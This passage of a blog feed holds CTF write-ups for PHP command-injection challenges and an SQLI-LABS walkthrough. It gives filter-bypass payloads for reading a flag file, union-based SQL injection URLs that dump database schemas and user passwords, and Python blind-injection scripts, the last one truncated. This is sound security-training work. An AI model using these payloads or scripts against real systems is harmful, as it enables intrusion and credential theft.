src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091532350.png" alt="image-20221009153235279"></p><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 22:50:30</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关将我们经常使用的&lt;&gt;过滤了，但同时也放出了$，所以我们直接用${IFS}绕过</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091552223.png" alt="image-20221009155208157"></p><p>访问源码</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091556490.png" alt="image-20221009155612450"></p><p>。。。。</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091557961.jpeg" alt="img"></p><p>访问根目录发现，flag在根目录</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091558124.png" alt="image-20221009155857033"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fla&#x27;&#x27;g||</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091602546.png" alt="image-20221009160201465"></p><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 18:21:02</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.$d;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关和前几关不一样，没了无回显的截断，但是过滤的参数挺多，但依然可以把上一关的payload稍微修改一下接着用</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091616598.png" alt="image-20221009161615532"></p><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 19:43:42</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关做的有点懵，直接无从下手</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091620071.png" alt="image-20221009162004002"></p><p>发现ls能正常运行，这题主要过滤cat、flag、空格、数字、$ 、*、more、wegt、less、head、sort、tail、sed、cut、tac、awk、strings、od、curl、<code>nl、scp、rm</code>、&#96;、\x09【制表符】、\x26【&amp;】、&lt;、&gt;</p><p>预期使用rev解出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=rev$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210221057922.png" alt="image-20221022105718856"></p><p>查看wp时，发现了四种其他方法</p><p>第一种是xxd转16进制输出，需要查看源码才能看到全部</p><p>?c&#x3D;xxd${IFS}fla?.php</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210221058401.png" alt="image-20221022105843341"></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210221058172.png" alt="image-20221022105858134"></p><p>第二种是进入&#x2F;bin&#x2F;c?t调用cat命令，同样需要进入源码查看</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210221105301.png" alt="image-20221022110525244"></p><p>这关我唯一疑惑的就是，为啥fla?输出不了，f???还有????却输出了，可其他方法fla?都能正常输出</p><p>第三种grep查询字符,flag有个特殊标识就是{}所以我们可以用grep查询{就可以输出flag值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;&#x27;&#123;&#x27;$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210221112138.png" alt="image-20221022111220073"></p><p>第四种就是uniq方法了，这个是检测重复的值，但不加任何命令时也同样可以把原字符串全部输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210221118168.png" alt="image-20221022111806125"></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210221118888.png" alt="image-20221022111853848"></p><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">\# -*- coding: utf-8 -*-</span><br><span class="line">\# @Author: Lazzaro</span><br><span class="line">\# @Date:  2020-09-05 20:49:30</span><br><span class="line">\# @Last Modified by:  h1xa</span><br><span class="line">\# @Last Modified time: 2020-09-07 20:03:51</span><br><span class="line">\# @email: h1xa@ctfer.com</span><br><span class="line">\# @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">  $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">  if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">    system($c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关过滤了全字母，搞得我无从下手，看大佬wp发现用通配符匹配&#x2F;bin&#x2F;base64，因为数字没被匹配所以可以使用</p><p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/????64 ????.???</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210221133388.png" alt="image-20221022113307328"></p><p>base64解码后即可得到flag</p><p>或者&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php将flag进行压缩后，访问flag.php.bz2即可获取</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLI-LABS</title>
      <link href="/2022/07/22/SQLI-LABS%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/07/22/SQLI-LABS%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLI-LABS靶场"><a href="#SQLI-LABS靶场" class="headerlink" title="SQLI-LABS靶场"></a>SQLI-LABS靶场</h1><p>[TOC]</p><h2 id="项目一-Advanced-Injections"><a href="#项目一-Advanced-Injections" class="headerlink" title="项目一(Advanced Injections)"></a>项目一(Advanced Injections)</h2><h3 id="sql基础知识："><a href="#sql基础知识：" class="headerlink" title="sql基础知识："></a>sql基础知识：</h3><p>查库： select schema_name from information_schema.schemata; </p><p>查表:  select table_name from information_schema.tables where table_schema&#x3D;’security’; </p><p>查列:    select column_name from information_schema.columns where table_name&#x3D;’users’; </p><p><a href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘users’–+</p><p>查字段:  select username,password from security.users;</p><p>‘ union select (substr(select table_name from information_schema.tables where </p><p>‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()) #  </p><p>1’  union select (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() ),2 #</p><p><strong>头部注入</strong></p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。<br>X-Forwarded-For:简称XFF头，它代表客户端，用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中。<br>Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。<br>X-Real-IP一般只记录真实发出请求的客户端IP。<br>Accept Language请求头允许客户端声明它可以理解的自然语言，以及优先选择的区域方言。<br> User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。<br>Accept代表客户端希望接受的数据类型，数据类型中的先后次序表示客户端接受的先后次序。<br>Referer表示一个来源，当浏览器向web服务器发送请求的时候，一般会带上Referer,告诉服务器我是从那个页面链接过来的，服务器借此可以获得一些信息用于处理。Referer用于所有类型的请求。</p><h4 id="Less-1："><a href="#Less-1：" class="headerlink" title="Less-1："></a>Less-1：</h4><p>进入第一关后从网页中可以看到直接给出了ID参数</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205231413739.png" alt="1"></p><p><strong>注入：</strong><a href="http://10.34.101.127/sqli-labs-master/Less-1/?id=1">http://10.34.101.127/sqli-labs-master/Less-1/?id=1</a>  *&#x2F;&#x2F;*可直接得到id&#x3D;1的参数</p><p><strong>测字段数：</strong><a href="http://10.34.101.127/sqli-labs-master/Less-1/?id=1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=1&#39;</a> order by 3 –+ &#x2F;&#x2F;返回无异常，字段数为3</p><p><strong>显位：</strong><a href="http://10.34.101.127/sqli-labs-master/Less-1/?id=1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=1&#39;</a> and 1&#x3D;2 union select 1,datebase(),version()–+ </p><p><strong>&#x2F;&#x2F;返回</strong>  Your Login name:security，Your Password:5.7.26.也就是当前数据库名为security，当前的mysql版本为5.7.26</p><p>**表名:**<a href="http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()) –+    返回表名:emails,referers,uagents,users</p><p><strong>解释：</strong>group_concat() 把多个表名堆在一个格子里面返回</p><p>字段名：<a href="http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D;’users’)–+</p><p><strong>显示</strong>YourPassword:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p><p><strong>账号和密码：</strong> <a href="http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205231413159.png" alt="3"></p><h4 id="Less-2："><a href="#Less-2：" class="headerlink" title="Less-2："></a>Less-2：</h4><h5 id="初步测试："><a href="#初步测试：" class="headerlink" title="初步测试："></a><strong>初步测试：</strong></h5><p>开始第二关，首先直接id&#x3D;1，有结果</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205212255563.png" alt="image-20220521225527507"></p><p>加个单引号试试，报错了，说明是数值型注入</p><p><strong>判断字段：</strong><a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> order by 3–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205292301070.png" alt="image-20220529230139022"></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205212258346.png" alt="image-20220521225839316"></p><p>注意LIMIT前面的符号，这里我第一个输入的id&#x3D;1” 第二个我输入的是 id&#x3D;1’ 有没有发现啥，我自己输入的东西报错了说明就是数值型注入还有一种方法就是 输入 id&#x3D;1 and 1&#x3D;1 没报错 输入 id&#x3D;1 and 1&#x3D;2报错的话 就是数值型植入，看你们自己的习惯吧</p><p><strong>爆破出数据库</strong>：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,database(),version() –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205212335232.png" alt="image-20220521233522182"></p><p><strong>爆出表名</strong>：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database())–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221301904.png" alt="image-20220522130131776"></p><p><strong>账号和密码</strong>：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a>  union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205292214212.png" alt="image-20220529221429158"></p><h4 id="Less-3："><a href="#Less-3：" class="headerlink" title="Less-3："></a>Less-3：</h4><p>注入：<a href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;</a>)</p><p>判断依据：在id值后面输入1\回显<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301039624.png" alt="image-20220530103918543"></p><p>由此可见闭合是’)</p><p><strong>测字段名</strong>：<a href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;</a>) order by 3–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301043335.png" alt="image-20220530104335284"></p><p>**爆破出数据库与版本:**<a href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,version(),group_concat(schema_name) from information_schema.schemata–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301241341.png" alt="image-20220530124112290"></p><p>爆出表名:<a href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301249163.png" alt="image-20220530124913117"></p><p><strong>爆出字段名：</strong><a href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301314768.png" alt="image-20220530131411721"></p><p><strong>账号和密码：</strong><a href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301358779.png" alt="image-20220530135831729"></p><h4 id="Less-4："><a href="#Less-4：" class="headerlink" title="Less-4："></a>Less-4：</h4><p><strong>注入点：</strong><a href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;</a>) </p><p>判断依据：1\后面的值为&quot;)所以闭合为”)</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301400768.png" alt="image-20220530140059733"></p><p><strong>字段数：</strong><a href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;</a>) order by 3 –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301402365.png" alt="image-20220530140209335"></p><p><strong>数据库名与版本</strong>：<a href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,(select group_concat(schema_name) from information_schema.schemata),version()–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301405035.png" alt="image-20220530140552988"></p><p><strong>表名</strong>：<a href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database())–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301423690.png" alt="image-20220530142312645"></p><p><strong>字段名</strong>：<a href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D;’users’–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301451817.png" alt="image-20220530145141777"></p><p>账号和密码：<a href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,(select group_concat(password) from users),(select group_concat(username) from users)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301452061.png" alt="image-20220530145255013"></p><h4 id="Less-5-8："><a href="#Less-5-8：" class="headerlink" title="Less-5-8："></a>Less-5-8：</h4><p><strong>注入点：</strong><a href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</a></p><p>判断依据：<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302302423.png" alt="image-20220530230236390"></p><p>这里很明显是’闭合</p><h5 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-6</strong></h5><p>先用python判断闭合，我这里写了一个比较简单的闭合检测。只能识别简单的闭合，时间注入还检测不了  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-6&quot;</span><br><span class="line">q = Queue()</span><br><span class="line">t = []</span><br><span class="line"></span><br><span class="line">a = open(&#x27;E://dictionary.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line">for line in a.read().split():</span><br><span class="line">    t.append(line)</span><br><span class="line">for i in t:</span><br><span class="line">    b = url+&#x27;/?id=1&#x27;+str(i)+&#x27;and 1=1 --+&#x27;</span><br><span class="line">    c = url+&#x27;/?id=1&#x27;+str(i)+&#x27;and 1=2 --+&#x27;</span><br><span class="line">    b = requests.get(b)</span><br><span class="line">    c = requests.get(c)</span><br><span class="line">    if b.text != c.text:</span><br><span class="line">         if &#x27;SQL&#x27; not in b.text or &#x27;SQL&#x27; not in c.text:</span><br><span class="line">              print(f&quot;闭合符为&#123;i&#125;&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206011827137.png" alt="image-20220601182731087"></p><p>一开始我还很奇怪，为什么有两个闭合符，但实验了一次，发现都能用，应该是把’ 作为输入的参数识别了，然后”闭合了。</p><h5 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h5><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021254325.png" alt="image-20220602125434241"></p><p>闭合符为’))</p><h5 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h5><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021255245.png" alt="image-20220602125519198"></p><p>闭合符为’</p><p><strong>其他的都一样，我这里以Less-5为例子</strong>，就不一一列举了</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302306465.png" alt="image-20220530230651421"></p><p>and 1&#x3D;1回显you are in ….  而and 1&#x3D;2却没有回显，所以应该是盲注</p><p><strong>测字段数：</strong><a href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</a> order by 3 –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205311754054.png" alt="image-20220531175437974"></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302309477.png" alt="image-20220530230916436"></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302309590.png" alt="image-20220530230931548"></p><p>盲注的话，比较麻烦，可以用substr函数一个一个试</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302314054.png" alt="image-20220530231424027"></p><p>这里的是试验成功了，成功返回了you are in..。一个一个试太麻烦了，直接burp suite跑快点，这里成功显示了数据库名为：security</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302301280.png" alt="image-20220530230122245"></p><p>另一个解法：python写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>,<span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and substr(database(),%d,1)=&#x27;%c&#x27;--+ &quot;</span>  %(i,j)</span><br><span class="line">            dic = &#123;<span class="string">&quot;search&quot;</span>:<span class="built_in">chr</span>(j),<span class="string">&quot;payload&quot;</span>:payload&#125;</span><br><span class="line">            q.put(dic)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">controller</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 